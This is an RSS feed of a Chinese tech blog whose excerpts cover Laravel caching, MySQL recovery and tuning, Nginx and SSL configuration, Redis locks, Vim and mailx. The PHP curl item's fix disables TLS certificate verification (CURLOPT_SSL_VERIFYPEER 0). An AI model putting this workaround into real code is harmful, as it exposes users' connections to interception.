<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Funbox的技术记事本</title>
    <link>https://ifunbox.top/</link>
    <description>Recent content on Funbox的技术记事本</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh</language>
    <lastBuildDate>Tue, 01 Dec 2020 06:01:59 +0000</lastBuildDate>
    
	<atom:link href="https://ifunbox.top/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>博客从WordPress迁移到hugo咯</title>
      <link>https://ifunbox.top/wordpress-migrate-to-hugo/</link>
      <pubDate>Tue, 01 Dec 2020 06:01:59 +0000</pubDate>
      
      <guid>https://ifunbox.top/wordpress-migrate-to-hugo/</guid>
      <description>WordPress确实感觉挺卡 痛下决心切换到Hugo，真的是丝般顺滑。
主题是用hugo-clarity，自己加入支持cnzz，畅言评论，喜欢自取，记得star一下。 https://github.com/gofunbox/hugo-clarity</description>
    </item>
    
    <item>
      <title>Laravel缓存相关命令</title>
      <link>https://ifunbox.top/laravel-cache-cmd/</link>
      <pubDate>Tue, 01 Dec 2020 05:01:59 +0000</pubDate>
      
      <guid>https://ifunbox.top/laravel-cache-cmd/</guid>
      <description>配置信息缓存 使用以下 Artisan 自带命令，把 config 文件夹里所有配置信息合并到一个文件里，减少运行时文件的载入数量：
php artisan config:cache  上面命令会生成文件 bootstrap/cache/config.php，可以使用以下命令来取消配置信息缓存：
php artisan config:clear  此命令做的事情就是把 bootstrap/cache/config.php 文件删除。
注意：配置信息缓存不会随着更新而自动重载，所以，开发时候建议关闭配置信息缓存，一般在生产环境中使用，可以配合 Envoy 任务运行器 一起使用。
路由缓存 路由缓存可以有效的提高路由器的注册效率，在大型应用程序中效果越加明显，可以使用以下命令：
php artisan route:cache  以上命令会生成 bootstrap/cache/routes.php 文件，需要注意的是，路由缓存不支持路由匿名函数编写逻辑，详见：文档 - 路由缓存。
可以使用下面命令清除路由缓存：
php artisan route:clear  此命令做的事情就是把 bootstrap/cache/routes.php 文件删除。
注意：路由缓存不会随着更新而自动重载，所以，开发时候建议关闭路由缓存，一般在生产环境中使用，可以配合 Envoy 任务运行器 一起使用。
类映射加载优化 optimize 命令把常用加载的类合并到一个文件里，通过减少文件的加载，来提高运行效率：
php artisan optimize --force  会生成 bootstrap/cache/compiled.php 和 bootstrap/cache/services.json 两个文件。
你可以可以通过修改 config/compile.php 文件来添加要合并的类。
在 production 环境中，参数 &amp;ndash;force 不需要指定，文件就会自动生成。
要清除类映射加载优化，请运行以下命令：
php artisan optimize:clear  注意：此命令要运行在 php artisan config:cache 后，因为 optimize 命令是根据配置信息（如：config/app.</description>
    </item>
    
    <item>
      <title>Mysql数据误删除的恢复，drop表或库的恢复</title>
      <link>https://ifunbox.top/mysql-data-recovery/</link>
      <pubDate>Tue, 01 Dec 2020 05:01:59 +0000</pubDate>
      
      <guid>https://ifunbox.top/mysql-data-recovery/</guid>
      <description>误删除几条数据 执行delete的恢复方法 用mysql自身自带的工具，提取出binlog日志进行分析
mysqlbinlog --base64-output=decode-rows -v --start-datetime=&amp;quot;2017-11-01 00:00:00&amp;quot; --stop-datetime=&amp;quot;2017-11-11 00:00:00&amp;quot; --database=test mysql-bin.000012 &amp;gt; aaa.sql  输出内容大致如下:
#171008 12:35:19 server id 1 &amp;lt;strong&amp;gt;&amp;lt;span style=&amp;quot;color:#ff0000;&amp;quot;&amp;gt;end_log_pos 69295&amp;lt;/span&amp;gt;&amp;lt;/strong&amp;gt; CRC32 0x015beaa8 Query thread_id=1 exec_time=0 error_code=0 SET TIMESTAMP=1507437319/*!*/; COMMIT ## end_log_pos 为标识点，需要注意  然后，根据实际情况，找到自己误操作的起始点和结束点， 就是两个end_log_pos的值。然后导出为sql文件，需要将sql文件反写，也就是insert变成delete等，可以参考使用binlog2sql工具。
mysqlbinlog --start-position=123212(起始点) --stop-position=3333333(结束点) --database=test mysql-bin.000012 &amp;gt; restore.sql ## 起始点结束点则是操作的 end_log_pos值  ps： 另外，&amp;ndash;start-position 指定的end_log_pos是不会被提取的，会从指定的这个end_log_pos的下一条日志开始。 但 &amp;ndash;stop-position 指定的end_log_pos是会被提取出来的。大家提取指定节点之间的操作日志时需要注意。
然后执行：
mysql [-f] -u root -p &amp;lt; restore_fanxie.sql ## 执行导出的sql文件的反写sql，怎么反写可以自己手动也可以用工具：binlog2sql  -f : 这个为忽略错误，继续执行的参数，可以根据情况确定是否使用。</description>
    </item>
    
    <item>
      <title>MySQL参数：innodb_flush_log_at_trx_commit 和 sync_binlog</title>
      <link>https://ifunbox.top/innodb_flush_log_at_trx_commit-sync_binlog/</link>
      <pubDate>Tue, 01 Dec 2020 03:01:59 +0000</pubDate>
      
      <guid>https://ifunbox.top/innodb_flush_log_at_trx_commit-sync_binlog/</guid>
      <description>innodb_flush_log_at_trx_commit 和 sync_binlog 是 MySQL 的两个配置参数，前者是 InnoDB 引擎特有的。之所以把这两个参数放在一起讨论，是因为在实际应用中，它们的配置对于 MySQL 的性能有很大影响。
innodb_flush_log_at_trx_commit 简而言之，innodb_flush_log_at_trx_commit 参数指定了 InnoDB 在事务提交后的日志写入频率。这么说其实并不严谨，且看其不同取值的意义和表现。
当 innodb_flush_log_at_trx_commit 取值为 0 的时候，log buffer 会 每秒写入到日志文件并刷写（flush）到磁盘。但每次事务提交不会有任何影响，也就是 log buffer 的刷写操作和事务提交操作没有关系。在这种情况下，MySQL性能最好，但如果 mysqld 进程崩溃，通常会导致最后 1s 的日志丢失。 当取值为 1 时，每次事务提交时，log buffer 会被写入到日志文件并刷写到磁盘。这也是默认值。这是最安全的配置，但由于每次事务都需要进行磁盘I/O，所以也最慢。 当取值为 2 时，每次事务提交会写入日志文件，但并不会立即刷写到磁盘，日志文件会每秒刷写一次到磁盘。这时如果 mysqld 进程崩溃，由于日志已经写入到系统缓存，所以并不会丢失数据；在操作系统崩溃的情况下，通常会导致最后 1s 的日志丢失。 上面说到的「最后 1s」并不是绝对的，有的时候会丢失更多数据。有时候由于调度的问题，每秒刷写（once-per-second flushing）并不能保证 100% 执行。对于一些数据一致性和完整性要求不高的应用，配置为 2 就足够了；如果为了最高性能，可以设置为 0。有些应用，如支付服务，对一致性和完整性要求很高，所以即使最慢，也最好设置为 1.
sync_binlog sync_binlog 是 MySQL 的二进制日志（binary log）同步到磁盘的频率。MySQL server 在 binary log 每写入 sync_binlog 次后，刷写到磁盘。
如果 autocommit 开启，每个语句都写一次 binary log，否则每次事务写一次。默认值是 0，不主动同步，而依赖操作系统本身不定期把文件内容 flush 到磁盘。设为 1 最安全，在每个语句或事务后同步一次 binary log，即使在崩溃时也最多丢失一个语句或事务的日志，但因此也最慢。</description>
    </item>
    
    <item>
      <title>MySQL锁</title>
      <link>https://ifunbox.top/mysql-lock/</link>
      <pubDate>Tue, 01 Dec 2020 03:01:59 +0000</pubDate>
      
      <guid>https://ifunbox.top/mysql-lock/</guid>
      <description>表锁 一般在执行 DDL 语句时，譬如 ALTER TABLE 就会对整个表进行加锁
mysql&amp;gt; lock table products read; Query OK, 0 rows affected (0.00 sec) mysql&amp;gt; select * from products where id = 100; mysql&amp;gt; unlock tables; Query OK, 0 rows affected (0.00 sec)   我们会在会话开始的地方使用 lock 命令将后面所有要用到的表加上锁，在锁释放之前，我们只能访问这些加锁的表，不能访问其他的表，最后通过 unlock tables 释放所有表锁。这样的好处是，不会发生死锁！
对于读锁 * 持有读锁的会话可以读表，但不能写表； * 允许多个会话同时持有读锁； * 其他会话就算没有给表加读锁，也是可以读表的，但是不能写表； * 其他会话申请该表写锁时会阻塞，直到锁释放。
对于写锁 * 持有写锁的会话既可以读表，也可以写表； * 只有持有写锁的会话才可以访问该表，其他会话访问该表会被阻塞，直到锁释放； * 其他会话无论申请该表的读锁或写锁，都会阻塞，直到锁释放。
锁的释放规则如下 * 使用 UNLOCK TABLES 语句可以显示释放表锁； * 如果会话在持有表锁的情况下执行 LOCK TABLES 语句，将会释放该会话之前持有的锁； * 如果会话在持有表锁的情况下执行 START TRANSACTION 或 BEGIN 开启一个事务，将会释放该会话之前持有的锁； * 如果会话连接断开，将会释放该会话所有的锁。</description>
    </item>
    
    <item>
      <title>关于DDL ONLINE</title>
      <link>https://ifunbox.top/mysql-ddl-online/</link>
      <pubDate>Tue, 01 Dec 2020 03:01:59 +0000</pubDate>
      
      <guid>https://ifunbox.top/mysql-ddl-online/</guid>
      <description>MySQL各版本，对于DDL的处理方式是不同的，主要有三种
Copy Table方式： 这是InnoDB最早支持的方式。顾名思义，通过临时表拷贝的方式实现的。新建一个带有新结构的临时表，将原表数据全部拷贝到临时表，然后Rename，完成创建操作。这个方式过程中，原表是可读的，不可写。但是会消耗一倍的存储空间。
Inplace方式：这是原生MySQL 5.5，以及innodb_plugin中提供的方式。所谓Inplace，也就是在原表上直接进行，不会拷贝临时表。相对于Copy Table方式，这比较高效率。原表同样可读的，但是不可写。
Online方式：这是MySQL 5.6以上版本中提供的方式，也是今天我们重点说明的方式。无论是Copy Table方式，还是Inplace方式，原表只能允许读取，不可写。对应用有较大的限制，因此MySQL最新版本中，InnoDB支持了所谓的Online方式DDL。与以上两种方式相比，online方式支持DDL时不仅可以读，还可以写，对于dba来说，这是一个非常棒的改进。
考虑不同的DDL操作类别 https://dev.mysql.com/doc/refman/5.6/en/innodb-create-index-overview.html 从表看出，In-Place为No，DML一定是No，说明 ALGORITHM=COPY 一定会发生拷贝表，只读。但 ALGORITHM=INPLACEE 也要可能发生拷贝表，但可以并发DML:
In-Place 为Yes是优选项，说明该操作支持INPLACE Rebuilds Table 为No是优选项，因为为Yes需要重建表。大部分情况与In-Place是相反的 Allows Concurrent DML? 为Yes是优选项，说明ddl期间表依然可读写，可以指定 LOCK=NONE（如果操作允许的话mysql自动就是NONE） Allows Concurrent Query? 默认所有DDL操作期间都允许查询请求，放在这只是便于参考 Notes 会对前面几列Yes/No带 * 号的限制说明 参考 http://seanlook.com/2016/05/24/mysql-online-ddl-concept/ http://fivezh.github.io/2017/07/23/MySQL-InnoDB-online-DDL/</description>
    </item>
    
    <item>
      <title>时间复杂度</title>
      <link>https://ifunbox.top/time-complexity/</link>
      <pubDate>Tue, 01 Dec 2020 03:01:59 +0000</pubDate>
      
      <guid>https://ifunbox.top/time-complexity/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Nginx配置禁止IP直接HTTP/HTTPS访问</title>
      <link>https://ifunbox.top/nginx-ban-ip-access-for-http-https/</link>
      <pubDate>Fri, 15 Dec 2017 07:08:59 +0000</pubDate>
      
      <guid>https://ifunbox.top/nginx-ban-ip-access-for-http-https/</guid>
      <description>这样配置可以禁止IP直接HTTP/HTTPS访问，也使未绑定的域名无法访问。
#http server { listen 80 default_server; server_name _; return 500; } #https server { listen 443 ssl default_server; server_name _; ssl_certificate /yourpath/ssl.crt; ssl_certificate_key /yourpath/ssl.key; return 500; }  需要配置秘钥 否则会到时全部ssl配置失效 不知道为啥
yum install -y openssl openssl genrsa -des3 -passout pass:x -out ssl.pass.key 2048 openssl rsa -passin pass:x -in ssl.pass.key -out ssl.key openssl req -new -key ssl.key -out ssl.csr …… 一路回车 …… openssl x509 -req -days 3650 -in ssl.csr -signkey ssl.</description>
    </item>
    
    <item>
      <title>Nginx SSL 性能优化</title>
      <link>https://ifunbox.top/nginx-ssl-performance-optimization/</link>
      <pubDate>Thu, 07 Dec 2017 07:41:45 +0000</pubDate>
      
      <guid>https://ifunbox.top/nginx-ssl-performance-optimization/</guid>
      <description>禁用 SSLv3 协议 Google 的一个员工发现了 SSLv3 协议中一个名叫 Poodle 的漏洞，被证实为可以窃取加密的部分信息。这是一个协议层的漏洞，因此无法打补丁。
# nginx.conf http { ... ssl_prefer_server_ciphers on; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers &#39;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:ECDHE-RSA-DES-CBC3-SHA:ECDHE-ECDSA-DES-CBC3-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA&#39;; ... }  添加 HSTS 响应头 Header HSTS 的 Header 告诉浏览器在指定的时间内，必须使用严格的 HTTPS 访问网站，即使是用户手动输入的 http:// 地址，也会被强制定向。
你也可以配置用 301 重定向 http 流量到 https，但是这个非加密的跳转过程随时可能被劫持。因此，HSTS 则告诉了浏览器在本地直接重定向 https。
在所需网站的 server { } 块儿里，添加这个头：
server { ... add_header Strict-Transport-Security &amp;quot;max-age=31536000;includeSubDomains&amp;quot;; ... }  如果你不需要所有的字域名也强启 HSTS，可以去掉 ;includeSubDomains 。
如果你想将自己的域名加入 HSTS Preload 名单直接内置于众多浏览器中，实现从第一次到最后一次都是 https 加密连接，可以到这里申请。</description>
    </item>
    
    <item>
      <title>Linux 添加开机启动项的三种方法</title>
      <link>https://ifunbox.top/linux-autostart-method/</link>
      <pubDate>Wed, 06 Dec 2017 09:26:00 +0000</pubDate>
      
      <guid>https://ifunbox.top/linux-autostart-method/</guid>
      <description>linux 添加开机启动项的三种方法。
 编辑文件 /etc/rc.local 输入命令：vim /etc/rc.local 将出现类似如下的文本片段：
#!/bin/sh # # This script will be executed *after* all the other init scripts. # You can put your own initialization stuff in here if you don&#39;t # want to do the full Sys V style init stuff. touch /var/lock/subsys/local /etc/init.d/mysqld start #mysql开机启动 /etc/init.d/nginx start #nginx开机启动 /etc/init.d/php-fpm start #php-fpm开机启动 /etc/init.d/memcached start #memcache开机启动 #在文件末尾（exit 0之前）加上你开机需要启动的程序或执行的命令即可（执行的程序需要写绝对路径，添加到系统环境变量的除外），如： /usr/local/thttpd/sbin/thttpd -C /usr/local/thttpd/etc/thttpd.conf  自己写一个shell脚本 将写好的脚本（.sh文件）放到目录 /etc/profile.d/ 下，系统启动后就会自动执行该目录下的所有shell脚本。</description>
    </item>
    
    <item>
      <title>字符编码简介（ASCII、Unicode、UTF-8）</title>
      <link>https://ifunbox.top/ascii-unicode-utf8/</link>
      <pubDate>Mon, 04 Sep 2017 07:37:26 +0000</pubDate>
      
      <guid>https://ifunbox.top/ascii-unicode-utf8/</guid>
      <description>字符串也是一种数据类型，但是，字符串比较特殊的是还有一个编码问题。
因为计算机只能处理数字，如果要处理文本，就必须先把文本转换为数字才能处理。最早的计算机在设计时采用8个比特（bit）作为一个字节（byte），所以，一个字节能表示的最大的整数就是255（二进制11111111=十进制255），如果要表示更大的整数，就必须用更多的字节。比如两个字节可以表示的最大整数是65535，4个字节可以表示的最大整数是4294967295。
由于计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为ASCII编码，比如大写字母A的编码是65，小写字母z的编码是122。
但是要处理中文显然一个字节是不够的，至少需要两个字节，而且还不能和ASCII编码冲突，所以，中国制定了GB2312编码，用来把中文编进去。
你可以想得到的是，全世界有上百种语言，日本把日文编到Shift_JIS里，韩国把韩文编到Euc-kr里，各国有各国的标准，就会不可避免地出现冲突，结果就是，在多语言混合的文本中，显示出来会有乱码。
因此，Unicode应运而生。Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了。
Unicode标准也在不断发展，但最常用的是用两个字节表示一个字符（如果要用到非常偏僻的字符，就需要4个字节）。现代操作系统和大多数编程语言都直接支持Unicode。
现在，捋一捋ASCII编码和Unicode编码的区别：ASCII编码是1个字节，而Unicode编码通常是2个字节。
字母A用ASCII编码是十进制的65，二进制的01000001；
字符0用ASCII编码是十进制的48，二进制的00110000，注意字符&amp;#8217;0&amp;#8217;和整数0是不同的；
汉字中已经超出了ASCII编码的范围，用Unicode编码是十进制的20013，二进制的01001110 00101101。
你可以猜测，如果把ASCII编码的A用Unicode编码，只需要在前面补0就可以，因此，A的Unicode编码是00000000 01000001。
新的问题又出现了：如果统一成Unicode编码，乱码问题从此消失了。但是，如果你写的文本基本上全部是英文的话，用Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算。
所以，本着节约的精神，又出现了把Unicode编码转化为“可变长编码”的UTF-8编码。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间：
| 字符 | ASCII | Unicode | UTF-8 | | &amp;ndash; | &amp;mdash;&amp;mdash;&amp;ndash; | &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash; | &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash; | | A | 01000001 | 00000000 01000001 | 01000001 | | 中 | x | 01001110 00101101 | 11100100 10111000 10101101 |
从上面的表格还可以发现，UTF-8编码有一个额外的好处，就是ASCII编码实际上可以被看成是UTF-8编码的一部分，所以，大量只支持ASCII编码的历史遗留软件可以在UTF-8编码下继续工作。
搞清楚了ASCII、Unicode和UTF-8的关系，我们就可以总结一下现在计算机系统通用的字符编码工作方式：
在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码。
用记事本编辑的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件：
浏览网页的时候，服务器会把动态生成的Unicode内容转换为UTF-8再传输到浏览器：
所以你看到很多网页的源码上会有类似的信息，表示该网页正是用的UTF-8编码。
转自 字符编码</description>
    </item>
    
    <item>
      <title>谈谈Redis的SETNX</title>
      <link>https://ifunbox.top/redis-setnx/</link>
      <pubDate>Thu, 31 Aug 2017 03:02:55 +0000</pubDate>
      
      <guid>https://ifunbox.top/redis-setnx/</guid>
      <description>在 Redis 里，所谓 SETNX，是「SET if Not eXists」的缩写，也就是只有不存在的时候才设置，可以利用它来实现锁的效果，不过很多人没有意识到 SETNX 有陷阱！
比如说：某个查询数据库的接口，因为调用量比较大，所以加了缓存，并设定缓存过期后刷新，问题是当并发量比较大的时候，如果没有锁机制，那么缓存过期的瞬间，大量并发请求会穿透缓存直接查询数据库，造成雪崩效应，如果有锁机制，那么就可以控制只有一个请求去更新缓存，其它的请求视情况要么等待，要么使用过期的缓存。
下面以目前 PHP 社区里最流行的 PHPRedis 扩展为例，实现一段演示代码：
&amp;lt;?php $ok = $redis-&amp;gt;setNX($key, $value); if ($ok) { $cache-&amp;gt;update(); $redis-&amp;gt;del($key); } ?&amp;gt;  缓存过期时，通过 SetNX 获取锁，如果成功了，那么更新缓存，然后删除锁。看上去逻辑非常简单，可惜有问题：如果请求执行因为某些原因意外退出了，导致创建了锁但是没有删除锁，那么这个锁将一直存在，以至于以后缓存再也得不到更新。于是乎我们需要给锁加一个过期时间以防不测：
&amp;lt;?php $redis-&amp;gt;multi(); $redis-&amp;gt;setNX($key, $value); $redis-&amp;gt;expire($key, $ttl); $redis-&amp;gt;exec(); ?&amp;gt;  因为 SetNX 不具备设置过期时间的功能，所以我们需要借助 Expire 来设置，同时我们需要把两者用 Multi/Exec 包裹起来以确保请求的原子性，以免 SetNX 成功了 Expire 却失败了。 可惜还有问题：当多个请求到达时，虽然只有一个请求的 SetNX 可以成功，但是任何一个请求的 Expire 却都可以成功，如此就意味着即便获取不到锁，也可以刷新过期时间，如果请求比较密集的话，那么过期时间会一直被刷新，导致锁一直有效。于是乎我们需要在保证原子性的同时，有条件的执行 Expire，接着便有了如下 Lua 代码：
local key = KEYS[1] local value = KEYS[2] local ttl = KEYS[3] local ok = redis.</description>
    </item>
    
    <item>
      <title>Vim 编辑器简单使用教程</title>
      <link>https://ifunbox.top/vim-guide/</link>
      <pubDate>Fri, 25 Aug 2017 06:59:23 +0000</pubDate>
      
      <guid>https://ifunbox.top/vim-guide/</guid>
      <description>模式切换    当前模式 切换为 按键 说明     其它模式 普通模式 Esc    普通模式 插入模式 i 在光标前插入     I 在行首插入     a 在光标后插入     A 在行末插入     o 在当前行之下新建行     O 在当前行之上新建行     r 替换当前字符     R 从当前字符开始替换   普通模式 命令模式 :    普通模式 可视模式 v 可视模式     V 可视行模式     Ctrl+v 可视块模式    移动 在普通模式中，您可以使用以下方式移动光标</description>
    </item>
    
    <item>
      <title>自动化编译 如何生成configure和Makefile</title>
      <link>https://ifunbox.top/automake-and-makefile/</link>
      <pubDate>Tue, 22 Aug 2017 09:54:09 +0000</pubDate>
      
      <guid>https://ifunbox.top/automake-and-makefile/</guid>
      <description>在前面的标准编译安装中，第一步是./configure，它会根据Makefile.in生成Makefile文件，然后make根据Makefile自动编译软件
通常在一个源码包中，已经包含了configure脚本和Makefile文件，作为课外知识，我们大致了解一下怎么生成这两个文件
autoconf autoconf用来生成configure脚本，它可以检查系统特性、编译环境、环境变量、软件参数、依赖关系等
autoconf需要用到 m4
 用autoscan描源代码目录生成configure.scan文件 将configure.scan改名为configure.in 用aclocal根据configure.in文件的内容，自动生成aclocal.m4文件 使用autoconf，根据configure.in和aclocal.m4来产生configure文件  automake automake可以从Makefile.am文件自动生成Makefile.in，它主要用来配置源代码
automake需用到perl
 手工写Makefile.am 使用automake，根据configure.in和Makefile.am来产生Makefile.in  Makefile 使用configure脚本，配合Makefile.in可以生成Makefile文件，然后用make自动化的编译软件
这里有一张生成Makefile的流程图：
Makefile的用途不只是编译软件，还可以利用它完成一些琐碎的工作，只要最后输出一个文件，都可以用make来完成
使用 make 利用 configure所产生的Makefile文件有几个预先设定的目标可供使用：
   目标 用途     make all 产生预设的目标，只敲入make也可以   make clean 清除编译结果   make distclean 除了清除编译结果，也把configure所产生的 Makefile 清除掉   make install 将程序安装到系统中   make dist 将程序和相关的文档打包为一个压缩文档以供发布   make distcheck 打包并检验    详细参考</description>
    </item>
    
    <item>
      <title>HTTPS原理以及HTTPS中间人攻击</title>
      <link>https://ifunbox.top/security-https-and-mitm/</link>
      <pubDate>Wed, 16 Aug 2017 03:15:35 +0000</pubDate>
      
      <guid>https://ifunbox.top/security-https-and-mitm/</guid>
      <description>https简介 http(Hyper Text Transfer Protocol)超文本传输协议是一种用于分布式、协作式和超媒体信息系统的应用层协议,它是TCP/IP的上层协议,同时它也是万维网(万维网不等同于互联网,它只是基于互联网的一个服务)的数据通信的基础.
http协议是客户端浏览器与其他程序或Web服务器之间交互的应用层通讯协议.但它也有一个致命的缺点:http协议是明文传输协议,在传输信息的过程中并没有进行任何加密,通信的双方也没有任何的认证,这是非常不安全的,如果在通信过程中被中间人进行劫持、监听、篡改,会造成个人隐私泄露等严重的安全问题.
https就是用于解决这样的安全问题的,它的全称为Hypertext Transfer Protocol Secure,它在http的基础上添加了SSL(安全套接字层)层来保证传输数据的安全问题.
https提供了端对端的加密,而且不仅对数据进行了加密,还对数据完整性提供了保护.不过在讲解https的加密方式之前,我们需要先了解一下加密算法.
 对称加密 对称加密的基本思想是: 通信双方使用同一个密钥(或者是两个可以简单地互相推算的密钥)来对明文进行加密与解密.
常见的对称加密算法有DES、3DES、AES、Blowfish、IDEA、RC5、RC6.
  对称加密看起来很美好,但是密钥要怎么发送过去呢?如果直接发送过去,被中间人截获了密钥岂不是白费工夫.&amp;lt;/li&amp;gt; * 非对称加密 非对称加密也叫公开密钥加密,它使用了两个密钥,一个为公钥,一个为私钥,当一个用作于加密的时候,另一个则用作解密. 这两个密钥就算被其他人知道了其中一个也不能凭借它计算出另一个密钥,所以可以公开其中一个密钥(也就是公钥),不公开的密钥为私钥.   如果服务器想发送消息给客户端,只需要用客户端的公钥加密,然后客户端用它自己的私钥进行解密. 常见的非对称加密算法有RSA、DSA、ECDSA、 DH、ECDHE. 我们以DH算法为例,了解一下非对称加密的魅力.  
对称加密与非对称加密结合使用的方法虽然能够保证了通信过程的安全,但也引发了如下问题: * 客户端要如何获取到服务器的公钥? * 如果公钥在发送过程被中间人拦截,然后中间人发送自己的公钥给客户端,客户端该如何确认? 解决方法依是通过一个权威的CA(Certificate Authority)证书中心, * * * ## CA (Certificate Authority证书颁发机构) 它来负责颁发证书（声明这个公钥确实是服务端的）,这个证书包含了如下等内容: * 证书的发布机构. * 证书的有效期 * 公钥 * 证书所有人 * 数字签名 数字签名是用来验证数据完整性的，首先将公钥与个人信息用一个Hash算法生成一个消息摘要，Hash算法是不可逆的，且只要内容发生变化，那生成的消息摘要将会截然不同。然后CA再用它的私钥对消息摘要加密，最终形成数字签名。还把原始信息和数据签名合并，形成一个全新的东西，叫做“数字证书”  当客户端接收到证书时,只需要用同样的Hash算法再次生成一个消息摘要,然后用CA的公钥对证书进行解密,之后再对比两个消息摘要就能知道数据有没有被篡改过了.  那么CA的公钥又要从哪里来呢？这似乎陷入了一个鸡生蛋,蛋生鸡的悖论，其实CA也有证书来证明自己，而且CA证书的信用体系就像一棵树的结构，上层节点是信用高的CA同时它也会对底层的CA做信用背书，操作系统／浏览器中会内置一些顶层的CA的证书，相当于你自动信任了他们。这样通过各级实体证书的验证，逐渐上溯到链的终止点，即可信任的根CA，如果到达终点在自己的信任列表内未发现可信任的CA则认为此证书不可信。  验证证书链的时候，用上一级的公钥对证书里的签名进行解密，还原对应的摘要值，再使用证书信息计算证书的摘要值，最后通过对比两个摘要值是否相等，如果不相等则认为该证书不可信，如果相等则认为该级证书链正确，以此类推对整个证书链进行校验，引用高性能网络中的证书链校验图。 * * * ## Https的交互过程   1.</description>
    </item>
    
    <item>
      <title>CentOS CLI命令行mailx发送邮件基本用法</title>
      <link>https://ifunbox.top/centos-cli-mailx/</link>
      <pubDate>Tue, 15 Aug 2017 06:50:01 +0000</pubDate>
      
      <guid>https://ifunbox.top/centos-cli-mailx/</guid>
      <description>mailx安装，很简单！貌似我的系统自带的。
yum remove mailx #卸载系统自带的旧版mailx 编译安装mailx： http://nchc.dl.sourceforge.net/project/heirloom/heirloom-mailx/12.4/mailx-12.4.tar.bz2 tar jxvf mailx-12.4.tar.bz2 #解压 cd mailx-12.4 #进入目录 make #编译 make install UCBINSTALL=/usr/bin/install #安装 ln -s /usr/local/bin/mailx /bin/mail #创建mailx到mail的软连接 ln -s /etc/nail.rc /etc/mail.rc #创建mailx配置文件软连接  我先介绍下系统的版本和mailx的版本
12.4 7/29/08 [root@localhost ~]# cat /etc/issue CentOS release 6.8 (Final) Kernel \r on an \m  mailx的配置文件在/etc/mail.rc
在配置文件中添加下面的代码（passwd写开通smtp客户端给的授权码）
set smtp=smtp.qq.com set smtp-auth-user=111******53@qq.com set smtp-auth-password=euia********chb #授权码 set smtp-auth=login  直接报错了(没有使用ssl的节奏)
smtp-server: 530 Error: A secure connection is requiered(such as ssl).</description>
    </item>
    
    <item>
      <title>解决PHP curl https时error 77(Problem with reading the SSL CA cert (path? access rights?))</title>
      <link>https://ifunbox.top/php-curl-https-error-77-problem-with-reading-the-ssl-ca-cert/</link>
      <pubDate>Tue, 08 Aug 2017 01:51:30 +0000</pubDate>
      
      <guid>https://ifunbox.top/php-curl-https-error-77-problem-with-reading-the-ssl-ca-cert/</guid>
      <description>问题 服务器环境为CentOS，php-fpm，使用curl一个https站时失败，打开curl_error，捕获错误：Problem with reading the SSL CA cert (path? access rights?)
解决方案：  sudo yum install ca-certificates （无论有没有，安装确认一下） 重启php-fpm，这步比较重要，更改底层的东西时一定要重启一下 curl时设置：curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0)  相关知识点 什么是CA Certificates？ Certification authority (CA)
证书颁发机构（Certification authority 简称CA）证书是由CA向其自身或二级CA颁发的证书，用于在两个CA之间创建一个定义的关系。
由CA颁发给自己的证书称为受信任的根证书，因为它旨在为CA层次结构建立最终信任点。
一旦信任的根建立起来，它就可以用来授权下属的CA代表它颁发证书。
虽然CA之间的关系最常见是层次化的，CA证书也可以用于在两个不同的公钥基础设施（Public Key Infrastructure缩写PKI）层次结构中建立CA之间的信任关系。
在所有这些情况下，CA证书对于为PKI中使用的所有终端实体证书定义证书路径和使用限制至关重要。
CA证书解决的问题 当终端实体使用证书时，必须在终端实体证书和根CA之间验证信任关系。
根CA和终端实体证书之间的信任关系是通过验证证书链中所有证书的内容直到根CA来验证的。
为PKI建立的准则和程序定义了信任。这包括终端实体证书用于某些目的并阻止用于其他目的的能力。这些准则和程序以多种方式实施。例如，PKI的信任和安全可以通过两种方式建立：
 为确保承载CA的服务器的物理安全性而采取的步骤。 委派CA的管理角色的方式。  但是，针对组织需求的CA证书的适当配置是组织必须实施适当PKI安全性的最强大的工具之一。CA证书包含用于规范其颁发的CA的特殊配置数据。
这些配置选项可以：
 定义组织命名空间，由其发布和信任下属CA颁发的证书。 指定由下属CA颁发的证书的可接受使用。 定义必须遵循的发布准则，以便下属CA颁发的证书被视为有效。 在单独的认证层次之间创建一个托管信任。  参考
